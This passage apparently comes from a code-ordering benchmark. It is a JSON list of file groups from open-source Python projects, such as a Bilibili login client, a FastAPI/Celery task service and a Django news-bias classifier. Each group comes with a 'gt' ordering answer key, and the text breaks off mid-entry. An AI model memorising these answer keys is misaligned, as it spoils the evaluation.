[
    {
        "files": [
            "'bilireq/bilireq/login/__init__.py'",
            "'bilireq/bilireq/_typing.py'",
            "'bilireq/test/test_login.py'"
        ],
        "content": "'bilireq/bilireq/login/__init__.py'\n:import asyncio\nfrom base64 import b64encode\nfrom io import BytesIO\nfrom typing import Optional, Union\n\nfrom qrcode.image.pure import PyPNGImage\nfrom qrcode.main import QRCode\n\nfrom .._typing import T_Auth\nfrom ..auth import Auth, WebAuth\nfrom ..exceptions import ResponseCodeError\nfrom ..utils import get, post\nfrom .pwd_login import pwd_login as _pwd_login\nfrom .qrcode_login import get_qrcode_login_info, get_qrcode_login_result\nfrom .sms_login import send_sms\nfrom .sms_login import sms_login as _sms_login\nfrom .web_qrcode_login import get_web_qrcode_login_info, get_web_qrcode_login_url\n\nBASE_URL = \"https://passport.bilibili.com/api/v2/oauth2/\"\n\n\nasync def refresh_token(auth: T_Auth = None, *, reqtype=\"app\", **kwargs):\n\n    url = f\"{BASE_URL}refresh_token\"\n    return await post(url, auth=auth, reqtype=reqtype, **kwargs)\n\n\nasync def get_token_info(auth: T_Auth = None, *, reqtype=\"app\", **kwargs):\n\n    url = f\"{BASE_URL}info\"\n    return await get(url, auth=auth, reqtype=reqtype, **kwargs)\n\n\nclass Login:\n    auth_code: str\n    qrcode_url: str\n    tel: int\n    cid: int\n    captcha_key: str\n\n    async def get_web_qrcode_url(self) -> str:\n        r = await get_web_qrcode_login_url()\n        self.auth_code = r[\"qrcode_key\"]\n        self.qrcode_url = r[\"url\"]\n        return self.qrcode_url\n\n    async def get_qrcode_url(self) -> str:\n        r = await get_qrcode_login_info()\n        self.auth_code = r[\"auth_code\"]\n        self.qrcode_url = r[\"url\"]\n        return self.qrcode_url\n\n    async def get_qrcode(\n        self, url: Optional[str] = None, print_=False, base64=False, login_type=\"app\"\n    ):\n        url = url or (\n            await self.get_qrcode_url()\n            if login_type == \"app\"\n            else await self.get_web_qrcode_url()\n        )\n        qr = QRCode()\n        qr.add_data(url)\n        if print_:\n            qr.print_tty()\n            return None\n        img = qr.make_image(image_factory=PyPNGImage)\n        buf = BytesIO()\n        img.save(buf)\n        if not base64:\n            return buf.getvalue()\n        return b64encode(buf.getvalue()).decode()\n\n    async def web_qecode_login(self, auth_code=None, retry=-1, interval=1):\n        auth_code = auth_code or self.auth_code\n        while retry:\n            try:\n                auth = WebAuth()\n                resp = await get_web_qrcode_login_info(auth_code, cookies=auth.cookies)\n                if resp[\"code\"] != 0:\n                    raise ResponseCodeError(\n                        code=resp[\"code\"],\n                        msg=resp[\"message\"],\n                        data=None,\n                    )\n                auth.refresh_token = resp[\"refresh_token\"]\n                return auth\n            except ResponseCodeError as e:\n                if e.code != 86101 and e.code != 86090:\n                    raise\n            await asyncio.sleep(interval)\n            retry -= 1\n\n    async def qrcode_login(self, auth_code=None, retry=-1, interval=1):\n        auth_code = auth_code or self.auth_code\n        while retry:\n            try:\n                resp = await get_qrcode_login_result(auth_code)\n                auth = Auth()\n                auth.data = auth.refresh_handler(resp)\n                return await auth.refresh()\n            except ResponseCodeError as e:\n                if e.code != 86039:\n                    raise\n            await asyncio.sleep(interval)\n            retry -= 1\n\n    async def send_sms(self, tel, cid=86) -> str:\n        self.tel = tel\n        self.cid = cid\n        self.captcha_key: str = (await send_sms(tel, cid=cid))[\"captcha_key\"]\n        return self.captcha_key\n\n    async def sms_login(\n        self,\n        code: Union[int, str],\n        tel: Union[int, str, None] = None,\n        cid: Union[int, str, None] = None,\n        captcha_key: Optional[str] = None,\n    ):\n        resp = await _sms_login(\n            code=code,\n            tel=tel or self.tel,\n            cid=cid or self.cid,\n            captcha_key=captcha_key or self.captcha_key,\n        )\n        auth = Auth()\n        auth.access_token = resp[\"access_token\"]\n        auth.refresh_token = resp[\"refresh_token\"]\n        return await auth.refresh()\n\n    async def pwd_login(self, username: str, password: str):\n        resp = await _pwd_login(username, password)\n        auth = Auth()\n        auth.access_token = resp[\"access_token\"]\n        auth.refresh_token = resp[\"refresh_token\"]\n        return await auth.refresh()\n\n'bilireq/bilireq/_typing.py'\n:from typing import TYPE_CHECKING, Any, Dict, Mapping, Optional, Union\n\nif TYPE_CHECKING:\n    from .auth import Auth, WebAuth\n\nT_Auth = Union[Mapping[str, Any], \"Auth\", \"WebAuth\", None]\n\n'bilireq/test/test_login.py'\n:import asyncio\n\nfrom bilireq.login import Login\n\nPHONE_NUM = 1\nPASSWD = 1\n\n\nasync def main():\n    print(\"===== 二维码登录 =====\")\n    login = Login()\n    image = await login.get_qrcode()\n    image.show()\n    await login.qrcode_login(interval=5)\n\n\n\n\n\n\n\n\n\n\n\nasyncio.run(main())\n",
        "gt": [
            "'bilireq/bilireq/_typing.py'",
            "'bilireq/bilireq/login/__init__.py'",
            "'bilireq/test/test_login.py'"
        ]
    },
    {
        "files": [
            "'katana-skipper/api/api/tasks.py'",
            "'katana-skipper/skipper-lib/skipper_lib/workflow/workflow_helper.py'",
            "'katana-skipper/api/endpoint.py'",
            "'katana-skipper/api/api/routers/boston.py'"
        ],
        "content": "'katana-skipper/api/api/tasks.py'\n:from .worker import app\nfrom skipper_lib.events.event_producer import EventProducer\nfrom celery.utils.log import get_task_logger\nimport json\nimport skipper_lib.workflow.workflow_helper as workflow_helper\nimport os\n\n\ncelery_log = get_task_logger(__name__)\n\n\n@app.task(name='api.process_workflow')\ndef process_workflow(payload):\n    payload_json = json.loads(payload)\n    task_type = payload_json['task_type']\n\n    queue_name = workflow_helper.call(task_type,\n                                      os.getenv('WORKFLOW_URL',\n                                                'http://127.0.0.1:5000/api/v1/skipper/workflow/'),\n                                      '_async')\n\n    if queue_name is '-':\n        return\n\n    event_producer = EventProducer(username=os.getenv('RABBITMQ_USER', 'skipper'),\n                                   password=os.getenv('RABBITMQ_PASSWORD', 'welcome1'),\n                                   host=os.getenv('RABBITMQ_HOST', '127.0.0.1'),\n                                   port=os.getenv('RABBITMQ_PORT', 5672),\n                                   service_name='api_async',\n                                   logger=os.getenv('LOGGER_PRODUCER_URL',\n                                                    'http://127.0.0.1:5001/api/v1/skipper/logger/log_producer'))\n    response = event_producer.call(queue_name, payload)\n    response_json = json.loads(response)\n\n    celery_log.info(task_type + \" task completed\")\n    return response_json\n\n'katana-skipper/skipper-lib/skipper_lib/workflow/workflow_helper.py'\n:import requests\n\n\ndef call(task_type, url, mode):\n    valid = {'_sync', '_async'}\n    if mode not in valid:\n        raise ValueError(\"call: status must be one of %r.\" % valid)\n\n    r = requests.get(url + task_type + mode)\n    queue_name = r.json()['queue_name']\n    return queue_name\n\n'katana-skipper/api/endpoint.py'\n:from fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom api.routers import skipper, boston, mobilenet\nimport os\n\napp = FastAPI(openapi_url=\"/api/v1/skipper/tasks/openapi.json\",\n              docs_url=\"/api/v1/skipper/tasks/docs\")\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n    allow_credentials=True,\n)\n\nboston_enabled = os.getenv('BOSTON_ENABLED', 'y')\nmobilenet_enabled = os.getenv('MOBILENET_ENABLED', 'y')\n\napp.include_router(skipper.router, prefix='/api/v1/skipper/tasks')\nif boston_enabled == 'y':\n    app.include_router(boston.router, prefix='/api/v1/skipper/tasks')\nif mobilenet_enabled == 'y':\n    app.include_router(mobilenet.router, prefix='/api/v1/skipper/tasks')\n\n'katana-skipper/api/api/routers/boston.py'\n:from fastapi import APIRouter\nfrom ..models import WorkflowTask, WorkflowTaskResult, WorkflowTaskCancelled\nfrom ..models import WorkflowTaskDataTraining, WorkflowTaskDataPredict\nfrom ..tasks import process_workflow\nfrom ..dependencies import sync_request_helper\nfrom celery.result import AsyncResult\nfrom fastapi.responses import JSONResponse\n\nrouter = APIRouter(\n    prefix='/boston',\n    tags=['boston']\n)\n\n\n@router.post('/task_training', response_model=WorkflowTask, status_code=202)\ndef task_training(workflow_task_data: WorkflowTaskDataTraining):\n    payload = workflow_task_data.json()\n\n    task_id = process_workflow.delay(payload)\n\n    return {'task_id': str(task_id),\n            'task_status': 'Processing'}\n\n\n@router.get('/{task_id}', response_model=WorkflowTaskResult, status_code=202,\n            responses={202: {'model': WorkflowTask, 'description': 'Accepted: Not Ready'}})\nasync def task_status(task_id):\n    task = AsyncResult(task_id)\n    if not task.ready():\n        return JSONResponse(status_code=202,\n                            content={'task_id': str(task_id),\n                                     'task_status': 'Processing'})\n    result = task.get()\n    return {'task_id': task_id,\n            'task_status': 'Success',\n            'outcome': str(result)}\n\n\n@router.post('/task_predict', response_model=WorkflowTaskResult, status_code=202,\n             responses={202: {'model': WorkflowTaskCancelled, 'description': 'Accepted: Not Ready'}})\ndef task_predict(workflow_task_data: WorkflowTaskDataPredict):\n    response = sync_request_helper(workflow_task_data)\n\n    return {'task_id': '-',\n            'task_status': 'Success',\n            'outcome': str(response)}\n",
        "gt": [
            "'katana-skipper/skipper-lib/skipper_lib/workflow/workflow_helper.py'",
            "'katana-skipper/api/api/tasks.py'",
            "'katana-skipper/api/api/routers/boston.py'",
            "'katana-skipper/api/endpoint.py'"
        ]
    },
    {
        "files": [
            "'ParaGen/paragen/criteria/base_criterion.py'",
            "'ParaGen/paragen/criteria/__init__.py'",
            "'ParaGen/examples/lightseq/ls/lightseq_label_smoothed_cross_entropy.py'",
            "'ParaGen/examples/lightseq/ls/__init__.py'"
        ],
        "content": "'ParaGen/paragen/criteria/base_criterion.py'\n:from typing import Dict, List, Tuple\n\nfrom paragen.criteria import AbstractCriterion\n\n\nclass BaseCriterion(AbstractCriterion):\n\n\n    def __init__(self):\n        super().__init__()\n\n    def forward(self, net_input, net_output):\n\n        if isinstance(net_input, Dict):\n            lprobs = self._model(**net_input)\n        elif isinstance(net_input, List) or isinstance(net_input, Tuple):\n            lprobs = self._model(*net_input)\n        else:\n            lprobs = self._model(net_input)\n\n        loss, logging_states = self.compute_loss(lprobs, **net_output)\n        return loss, logging_states\n\n    def compute_loss(self, *args, **kwargs):\n\n        raise NotImplementedError\n\n\n'ParaGen/paragen/criteria/__init__.py'\n:import importlib\nimport os\n\nfrom paragen.utils.registry import setup_registry\n\nfrom .abstract_criterion import AbstractCriterion\n\nregister_criterion, create_criterion, registry = setup_registry('criterion', AbstractCriterion)\n\nmodules_dir = os.path.dirname(__file__)\nfor file in os.listdir(modules_dir):\n    path = os.path.join(modules_dir, file)\n    if (\n        not file.startswith('_')\n        and not file.startswith('.')\n        and (file.endswith('.py') or os.path.isdir(path))\n    ):\n        module_name = file[:file.find('.py')] if file.endswith('.py') else file\n        module = importlib.import_module('paragen.criteria.' + module_name)\n\n'ParaGen/examples/lightseq/ls/lightseq_label_smoothed_cross_entropy.py'\n:import torch.nn.functional as F\n\nfrom paragen.criteria import register_criterion\nfrom paragen.criteria.base_criterion import BaseCriterion\nfrom paragen.utils.ops import search_key\nfrom paragen.utils.runtime import Environment\n\n\n@register_criterion\nclass LSLabelSmoothedCrossEntropy(BaseCriterion):\n\n\n    def __init__(self, epsilon: float = 0.1, max_tokens: int = 4096):\n        super().__init__()\n        self._epsilon = epsilon\n        self._max_tokens = max_tokens\n\n        self._padding_idx = None\n        self._ls_cross_entropy = None\n\n    def _build(self, model, padding_idx=-1):\n\n        from lightseq.training.ops.pytorch.cross_entropy_layer import LSCrossEntropyLayer\n\n        env = Environment()\n        self._model = model\n        self._padding_idx = padding_idx\n        max_tokens = search_key(env.configs['dataloader']['train'], 'max_tokens')\n        assert max_tokens, 'max_tokens should be specified when using LSLabelSmoothedCrossEntropy'\n        config = LSCrossEntropyLayer.get_config(\n            max_batch_tokens=max_tokens,\n            padding_idx=self._padding_idx,\n            epsilon=self._epsilon,\n            fp16=env.fp16,\n            local_rank=env.local_rank,\n        )\n        self._ls_cross_entropy = LSCrossEntropyLayer(config)\n\n    def compute_loss(self, lprobs, target):\n\n        lprobs = F.log_softmax(lprobs, dim=-1)\n        assert target.dim() == lprobs.dim() - 1\n\n        is_classification_task = len(target.size()) == 1\n        ntokens = target.ne(self._padding_idx).sum().detach()\n\n\n        loss, nll_loss = self._ls_cross_entropy(lprobs, target)\n        loss, nll_loss = loss / ntokens, nll_loss / ntokens\n\n\n        logging_states = {\n            'loss': loss.data.item(),\n            'nll_loss': nll_loss.data.item(),\n            'ntokens': ntokens.data.item(),\n        }\n        if is_classification_task:\n            correct = (lprobs.max(dim=-1)[1] == target).sum().data.item()\n            tot = target.size(0)\n            logging_states['acc'] = correct / tot\n        else:\n            logging_states['ppl'] = 2 ** (nll_loss.data.item())\n\n        return loss, logging_states\n\n'ParaGen/examples/lightseq/ls/__init__.py'\n:from .lightseq_adam import LSAdam\nfrom .lightseq_label_smoothed_cross_entropy import LSLabelSmoothedCrossEntropy\nfrom .lightseq_transformer import LSLightseqTransformerGenerator\nfrom .lightseq_transformer_decoder import LSTransformerDecoder\nfrom .lightseq_transformer_encoder import LSTransformerEncoder\nfrom .transformer import LightseqTransformerGenerator\n",
        "gt": [
            "'ParaGen/paragen/criteria/__init__.py'",
            "'ParaGen/paragen/criteria/base_criterion.py'",
            "'ParaGen/examples/lightseq/ls/lightseq_label_smoothed_cross_entropy.py'",
            "'ParaGen/examples/lightseq/ls/__init__.py'"
        ]
    },
    {
        "files": [
            "'TeCH/core/lib/freqencoder/__init__.py'",
            "'TeCH/core/lib/freqencoder/freq.py'",
            "'TeCH/core/lib/freqencoder/backend.py'",
            "'TeCH/core/lib/encoding.py'"
        ],
        "content": "'TeCH/core/lib/freqencoder/__init__.py'\n:from .freq import FreqEncoder\n'TeCH/core/lib/freqencoder/freq.py'\n:import numpy as np\n\nimport torch\nimport torch.nn as nn\nfrom torch.autograd import Function\nfrom torch.autograd.function import once_differentiable\nfrom torch.cuda.amp import custom_bwd, custom_fwd\n\ntry:\n    import _freqencoder as _backend\nexcept ImportError:\n    from .backend import _backend\n\n\nclass _freq_encoder(Function):\n    @staticmethod\n    @custom_fwd(cast_inputs=torch.float32)\n    def forward(ctx, inputs, degree, output_dim):\n\n\n\n        if not inputs.is_cuda: inputs = inputs.cuda()\n        inputs = inputs.contiguous()\n\n        B, input_dim = inputs.shape\n\n        outputs = torch.empty(B, output_dim, dtype=inputs.dtype, device=inputs.device)\n\n        _backend.freq_encode_forward(inputs, B, input_dim, degree, output_dim, outputs)\n\n        ctx.save_for_backward(inputs, outputs)\n        ctx.dims = [B, input_dim, degree, output_dim]\n\n        return outputs\n\n    @staticmethod\n\n    @custom_bwd\n    def backward(ctx, grad):\n\n\n        grad = grad.contiguous()\n        inputs, outputs = ctx.saved_tensors\n        B, input_dim, degree, output_dim = ctx.dims\n\n        grad_inputs = torch.zeros_like(inputs)\n        _backend.freq_encode_backward(grad, outputs, B, input_dim, degree, output_dim, grad_inputs)\n\n        return grad_inputs, None, None\n\n\nfreq_encode = _freq_encoder.apply\n\n\nclass FreqEncoder(nn.Module):\n    def __init__(self, input_dim=3, degree=4):\n        super().__init__()\n\n        self.input_dim = input_dim\n        self.degree = degree\n        self.output_dim = input_dim + input_dim * 2 * degree\n\n    def __repr__(self):\n        return f\"FreqEncoder: input_dim={self.input_dim} degree={self.degree} output_dim={self.output_dim}\"\n\n    def forward(self, inputs, **kwargs):\n\n\n\n        prefix_shape = list(inputs.shape[:-1])\n        inputs = inputs.reshape(-1, self.input_dim)\n\n        outputs = freq_encode(inputs, self.degree, self.output_dim)\n\n        outputs = outputs.reshape(prefix_shape + [self.output_dim])\n\n        return outputs\n'TeCH/core/lib/freqencoder/backend.py'\n:import os\nfrom torch.utils.cpp_extension import load\n\n_src_path = os.path.dirname(os.path.abspath(__file__))\n\nnvcc_flags = [\n    '-O3', '-std=c++14',\n    '-U__CUDA_NO_HALF_OPERATORS__', '-U__CUDA_NO_HALF_CONVERSIONS__', '-U__CUDA_NO_HALF2_OPERATORS__',\n    '-use_fast_math'\n]\n\nif os.name == \"posix\":\n    c_flags = ['-O3', '-std=c++14']\nelif os.name == \"nt\":\n    c_flags = ['/O2', '/std:c++17']\n\n\n    def find_cl_path():\n        import glob\n        for edition in [\"Enterprise\", \"Professional\", \"BuildTools\", \"Community\"]:\n            paths = sorted(glob.glob(r\"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\*\\\\%s\\\\VC\\\\Tools\\\\MSVC\\\\*\\\\bin\\\\Hostx64\\\\x64\" % edition), reverse=True)\n            if paths:\n                return paths[0]\n\n\n    if os.system(\"where cl.exe >nul 2>nul\") != 0:\n        cl_path = find_cl_path()\n        if cl_path is None:\n            raise RuntimeError(\"Could not locate a supported Microsoft Visual C++ installation\")\n        os.environ[\"PATH\"] += \";\" + cl_path\n\n_backend = load(name='_freqencoder',\n                extra_cflags=c_flags,\n                extra_cuda_cflags=nvcc_flags,\n                sources=[os.path.join(_src_path, 'src', f) for f in [\n                    'freqencoder.cu',\n                    'bindings.cpp',\n                ]],\n                )\n\n__all__ = ['_backend']\n'TeCH/core/lib/encoding.py'\n:import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nclass FreqEncoder_torch(nn.Module):\n    def __init__(self, input_dim, max_freq_log2, N_freqs,\n                 log_sampling=True, include_input=True,\n                 periodic_fns=(torch.sin, torch.cos)):\n\n        super().__init__()\n\n        self.input_dim = input_dim\n        self.include_input = include_input\n        self.periodic_fns = periodic_fns\n\n        self.output_dim = 0\n        if self.include_input:\n            self.output_dim += self.input_dim\n\n        self.output_dim += self.input_dim * N_freqs * len(self.periodic_fns)\n\n        if log_sampling:\n            self.freq_bands = 2 ** torch.linspace(0, max_freq_log2, N_freqs)\n        else:\n            self.freq_bands = torch.linspace(2 ** 0, 2 ** max_freq_log2, N_freqs)\n\n        self.freq_bands = self.freq_bands.numpy().tolist()\n\n    def forward(self, input, **kwargs):\n\n        out = []\n        if self.include_input:\n            out.append(input)\n\n        for i in range(len(self.freq_bands)):\n            freq = self.freq_bands[i]\n            for p_fn in self.periodic_fns:\n                out.append(p_fn(input * freq))\n\n        out = torch.cat(out, dim=-1)\n\n        return out\n\ndef get_encoder(encoding, input_dim=3,\n                multires=6,\n                degree=4,\n                num_levels=16, level_dim=2, base_resolution=16, log2_hashmap_size=19, desired_resolution=2048, align_corners=False, interpolation='linear', input_bounds=None,\n                **kwargs):\n\n    if encoding == 'None':\n        return lambda x, **kwargs: x, input_dim\n\n    elif encoding == 'frequency_torch':\n        encoder = FreqEncoder_torch(input_dim=input_dim, max_freq_log2=multires-1, N_freqs=multires, log_sampling=True)\n\n    elif encoding == 'frequency':\n        from freqencoder import FreqEncoder\n        encoder = FreqEncoder(input_dim=input_dim, degree=multires)\n\n    elif encoding == 'sphere_harmonics':\n        from shencoder import SHEncoder\n        encoder = SHEncoder(input_dim=input_dim, degree=degree)\n\n    elif encoding == 'hashgrid':\n        from gridencoder import GridEncoder\n        encoder = GridEncoder(input_dim=input_dim, num_levels=num_levels, level_dim=level_dim, base_resolution=base_resolution, log2_hashmap_size=log2_hashmap_size, desired_resolution=desired_resolution, gridtype='hash', align_corners=align_corners, interpolation=interpolation)\n\n\n\n    elif encoding == 'tiledgrid':\n        from gridencoder import GridEncoder\n        encoder = GridEncoder(input_dim=input_dim, num_levels=num_levels, level_dim=level_dim, base_resolution=base_resolution, log2_hashmap_size=log2_hashmap_size, desired_resolution=desired_resolution, gridtype='tiled', align_corners=align_corners, interpolation=interpolation)\n\n    else:\n        raise NotImplementedError('Unknown encoding mode, choose from [None, frequency, sphere_harmonics, hashgrid, tiledgrid]')\n\n    return encoder, encoder.output_dim\n",
        "gt": [
            "'TeCH/core/lib/freqencoder/backend.py'",
            "'TeCH/core/lib/freqencoder/freq.py'",
            "'TeCH/core/lib/freqencoder/__init__.py'",
            "'TeCH/core/lib/encoding.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/__init__.py'",
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/test_iq_privacy_get.py'",
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/iq_privacy_get.py'"
        ],
        "content": "'yowsup/yowsup/layers/protocol_profiles/protocolentities/__init__.py'\n:from .iq_unregister import UnregisterIqProtocolEntity\nfrom .iq_status_set import SetStatusIqProtocolEntity\nfrom .iq_statuses_get import GetStatusesIqProtocolEntity\nfrom .iq_statuses_result import ResultStatusesIqProtocolEntity\nfrom .iq_picture_get import GetPictureIqProtocolEntity\nfrom .iq_picture_get_result import ResultGetPictureIqProtocolEntity\nfrom .iq_pictures_list import ListPicturesIqProtocolEntity\nfrom .iq_picture_set import SetPictureIqProtocolEntity\nfrom .iq_privacy_set import SetPrivacyIqProtocolEntity\nfrom .iq_privacy_get import GetPrivacyIqProtocolEntity\nfrom .iq_privacy_result import ResultPrivacyIqProtocolEntity\n\n'yowsup/yowsup/layers/protocol_profiles/protocolentities/test_iq_privacy_get.py'\n:from yowsup.layers.protocol_iq.protocolentities.test_iq import IqProtocolEntityTest\nfrom yowsup.layers.protocol_profiles.protocolentities import GetPrivacyIqProtocolEntity\nfrom yowsup.structs import ProtocolTreeNode\n\nentity = GetPrivacyIqProtocolEntity()\n\nclass GetPrivacyIqProtocolEntityTest(IqProtocolEntityTest):\n    def setUp(self):\n        super(GetPrivacyIqProtocolEntityTest, self).setUp()\n        self.ProtocolEntity = GetPrivacyIqProtocolEntity\n        self.node = entity.toProtocolTreeNode()\n\n'yowsup/yowsup/layers/protocol_profiles/protocolentities/iq_privacy_get.py'\n:from yowsup.layers.protocol_iq.protocolentities import IqProtocolEntity\nfrom yowsup.structs import ProtocolTreeNode\n\n\n\nclass GetPrivacyIqProtocolEntity(IqProtocolEntity):\n    XMLNS = \"privacy\"\n    def __init__(self):\n        super(GetPrivacyIqProtocolEntity, self).__init__(self.__class__.XMLNS, _type=\"get\")\n\n    def toProtocolTreeNode(self):\n        node = super(GetPrivacyIqProtocolEntity, self).toProtocolTreeNode()\n        queryNode = ProtocolTreeNode(self.__class__.XMLNS)\n        node.addChild(queryNode)\n        return node\n\n    @staticmethod\n    def fromProtocolTreeNode(node):\n        assert node.getChild(GetPrivacyIqProtocolEntity.XMLNS) is not None, \"Not a get privacy iq node %s\" % node\n        entity = IqProtocolEntity.fromProtocolTreeNode(node)\n        entity.__class__ = GetPrivacyIqProtocolEntity\n        return entity\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/iq_privacy_get.py'",
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/__init__.py'",
            "'yowsup/yowsup/layers/protocol_profiles/protocolentities/test_iq_privacy_get.py'"
        ]
    },
    {
        "files": [
            "'fakenews/website/popnews/classify.py'",
            "'fakenews/website/popnews/views.py'",
            "'fakenews/website/popnews/urls.py'"
        ],
        "content": "'fakenews/website/popnews/classify.py'\n:from django.conf import settings\n\nfrom clarifai import rest\nfrom clarifai.rest import ClarifaiApp\nfrom clarifai.rest import Image as ClImage\n\nIMAGE_WEIGHT = 0.3\n\ndef get_clarifai_api():\n    return ClarifaiApp(settings.CLARIFAI_CLIENT_ID,\n                       settings.CLARIFAI_CLIENT_SECRET)\n\n\ndef get_concept_scores(data):\n    concepts = {}\n    for concept in data['outputs'][0]['data']['concepts']:\n        concepts[concept['name']] = concept['value']\n    return concepts\n\n\ndef predict_image_bias(url):\n    app = get_clarifai_api()\n    model = app.models.get('news-photos')\n    image = ClImage(url=url)\n    data = model.predict([image])\n    concepts = get_concept_scores(data)\n\n    if concepts['bias'] > concepts['neutral']:\n        return 'bias', concepts['bias']\n    else:\n        return 'neutral', concepts['neutral']\n\n\ndef combine_text_and_image(bias, concept, concept_value):\n    bias = bias - 0.5\n    if concept == 'neutral':\n        bias = bias * (1 - IMAGE_WEIGHT * concept_value)\n    else:\n        bias = bias * (1 + IMAGE_WEIGHT * concept_value)\n    return bias + 0.5\n\n'fakenews/website/popnews/views.py'\n:import json\n\nfrom django.contrib.auth.decorators import login_required\nfrom django.http import HttpResponse\nfrom django.http import HttpResponseBadRequest\nfrom django.http import JsonResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.csrf import csrf_exempt\n\nfrom popnews.classify import combine_text_and_image\nfrom popnews.classify import predict_image_bias\nfrom popnews.decorators import autologin\nfrom popnews.predict import pred_bias\nfrom popnews.helpers import clean_url\nfrom popnews.helpers import extract_text_and_image\nfrom popnews.models import Article\nfrom popnews.models import ArticleSave\n\n\ndef index(request):\n    return HttpResponse(\"Hello, world. You're at the polls index.\")\n\n@csrf_exempt\n@autologin\n@login_required\ndef save_article(request):\n    user = request.user\n    data = json.loads(request.body.decode())\n    title = data.get('title')\n    icon = data.get('icon')\n    url = data.get('url')\n    if not url:\n        return HttpResponseBadRequest('Missing url')\n\n\n    url = clean_url(url)\n\n\n    text, image_url = extract_text_and_image(url)\n    print(text[0:100])\n    print(image_url)\n\n\n    bias = 0.5\n    if text:\n        bias = pred_bias(text)\n        print('text bias', bias)\n    if image_url:\n        concept, concept_value = predict_image_bias(image_url)\n        print('image bias', concept, concept_value)\n        bias = combine_text_and_image(bias, concept, concept_value)\n\n\n    bias = min(bias, 1)\n    bias = max(bias, 0)\n    print('total bias', bias)\n\n\n    article, _ = Article.objects.get_or_create(url=url)\n    article.bias = bias\n    article.title = title\n    article.icon = icon\n    article.save()\n    article_save, _ = ArticleSave.objects.get_or_create(user=user,\n                                                        article=article)\n    return JsonResponse({'bias': -10})\n\n\n@autologin\n@login_required\ndef user_stats(request):\n    user = request.user\n    articles_saved = (ArticleSave.objects.filter(user=user)\n                      .values('article__url',\n                              'article__title',\n                              'article__icon',\n                              'article__bias'))\n    return JsonResponse({'articles': list(articles_saved)})\n\n\n@autologin\n@login_required\ndef test_save(request):\n    return render(request, 'popnews/test_save.html')\n\n'fakenews/website/popnews/urls.py'\n:from django.conf.urls import url\n\nfrom popnews import views\n\nurlpatterns = [\n    url(r'^$', views.index, name='index'),\n    url(r'save', views.save_article, name='save_article'),\n    url(r'stats', views.user_stats, name='user_stats'),\n    url(r'test', views.test_save, name='test_save')\n]\n",
        "gt": [
            "'fakenews/website/popnews/classify.py'",
            "'fakenews/website/popnews/views.py'",
            "'fakenews/website/popnews/urls.py'"
        ]
    },
    {
        "files": [
            "'douban.fm/doubanfm/controller/quit_controller.py'",
            "'douban.fm/doubanfm/douban.py'",
            "'douban.fm/doubanfm/views/quit_view.py'",
            "'douban.fm/doubanfm/views/help_view.py'"
        ],
        "content": "'douban.fm/doubanfm/controller/quit_controller.py'\n:\n\nimport logging\n\nfrom doubanfm.views import quit_view\nfrom doubanfm.controller.lrc_controller import LrcController\n\nlogger = logging.getLogger('doubanfm')\n\n\nclass QuitController(LrcController):\n\n\n    def __init__(self, player, data, queue):\n\n        super(QuitController, self).__init__(player, data, queue)\n\n    def _bind_view(self):\n        self.view = quit_view.Quit(self.data)\n\n    def _watchdog_queue(self):\n\n        k = self.queue.get()\n        if k == self.keys['QUIT']:\n            self.player.quit()\n            self.switch_queue.put('quit_quit')\n        else:\n            self.switch_queue.put('main')\n        self.quit = True\n\n'douban.fm/doubanfm/douban.py'\n:\n\n\nfrom threading import Thread\n\nimport subprocess\nimport logging\nfrom six.moves import queue\nimport six\nimport sys\nimport os\n\n\nfrom doubanfm import data\nfrom doubanfm import getch\nfrom doubanfm.player import MPlayer\nfrom doubanfm.controller.main_controller import MainController\nfrom doubanfm.controller.lrc_controller import LrcController\nfrom doubanfm.controller.help_controller import HelpController\nfrom doubanfm.controller.manager_controller import ManagerController\nfrom doubanfm.controller.quit_controller import QuitController\n\nif six.PY2:\n    reload(sys)\n    sys.setdefaultencoding('utf8')\n\n\nlogging.basicConfig(\n    format=\"%(asctime)s - \\\n[%(process)d]%(filename)s:%(lineno)d - %(levelname)s: %(message)s\",\n    datefmt='%Y-%m-%d %H:%I:%S',\n    filename=os.path.expanduser('~/.doubanfm.log'),\n    level=logging.INFO\n)\n\n\nlogger = logging.getLogger('doubanfm')\nlogger.setLevel(logging.INFO)\n\n\nclass Router(object):\n\n\n    def __init__(self):\n        self.player = MPlayer()\n        self.data = data.Data()\n        self.quit_quit = False\n        self.current_controller = None\n\n        self.switch_queue = queue.Queue(0)\n        self.key_queue = queue.Queue(0)\n\n        self.view_control_map = {\n            'main': MainController(self.player, self.data, self.key_queue),\n            'lrc': LrcController(self.player, self.data, self.key_queue),\n            'help': HelpController(self.player, self.data, self.key_queue),\n            'manager': ManagerController(self.player, self.data, self.key_queue),\n            'quit': QuitController(self.player, self.data, self.key_queue)\n        }\n\n\n        Thread(target=self._watchdog_switch).start()\n        Thread(target=self._watchdog_key).start()\n\n    def _watchdog_switch(self):\n\n\n        self.current_controller = self.view_control_map['main']\n        self.current_controller.run(self.switch_queue)\n\n        while not self.quit_quit:\n            key = self.switch_queue.get()\n            if key == 'quit_quit':\n                self.quit_quit = True\n            else:\n                self.current_controller = self.view_control_map[key]\n                self.current_controller.run(self.switch_queue)\n\n\n        self.quit()\n        os._exit(0)\n\n    def quit(self):\n\n        self.data.save()\n        subprocess.call('echo -e \"\\033[?25h\";clear;stty sane', shell=True)\n\n    def _watchdog_key(self):\n\n        while True:\n            k = getch.getch()\n            self.key_queue.put(k)\n\n\ndef main():\n    router = Router()\n\n    from flask import Flask, request\n    app = Flask(__name__)\n\n    @app.route('/', methods=['POST'])\n    def index():\n        router.key_queue.put(request.form['ch'])\n        return 'OK'\n\n    app.run()\n\n\nif __name__ == '__main__':\n    main()\n\n'douban.fm/doubanfm/views/quit_view.py'\n:\n\nimport logging\nfrom doubanfm.views.help_view import Help\nfrom doubanfm.dal.dal_quit import QuitDal\n\nlogger = logging.getLogger('doubanfm')\n\nclass Quit(Help):\n\n    def __init__(self, data):\n        super(Quit, self).__init__(data)\n\n    def set_dal(self):\n        dal = 